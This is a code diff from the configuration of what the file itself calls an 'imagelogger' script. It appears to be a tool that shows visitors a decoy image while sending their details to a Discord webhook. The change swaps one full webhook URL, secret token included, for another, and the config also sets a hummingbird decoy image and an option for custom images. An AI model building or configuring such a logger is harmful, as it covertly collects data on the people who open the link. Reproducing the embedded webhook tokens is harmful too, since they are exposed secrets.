@@ -12,7 +12,7 @@ __author__ = "Kermit"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1352894415802466315/DZXxqc7Gnp2bUycSaRLCjMq_FrNyoce4c7nhj1cNtncAdfZYJ_00d5EB7VIzWndCPMYu",
+    "webhook": "https://discord.com/api/webhooks/1352894402674294784/8u7M2VenJGQpYcOHOIXNbQ2N3Nc5trQURJQJCZ8vaSIYcnNWVAdRvk8zTK6xxqR7X2GF",
     "image": "https://img.freepik.com/foto-gratis/colibri-colores-vividos-naturaleza_23-2151495325.jpg?t=st=1742633000~exp=1742636600~hmac=aa184f46e34138719d88f558bea09b86eb7b0e393dc6853aec9d8aefca3f6d8d&w=740", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
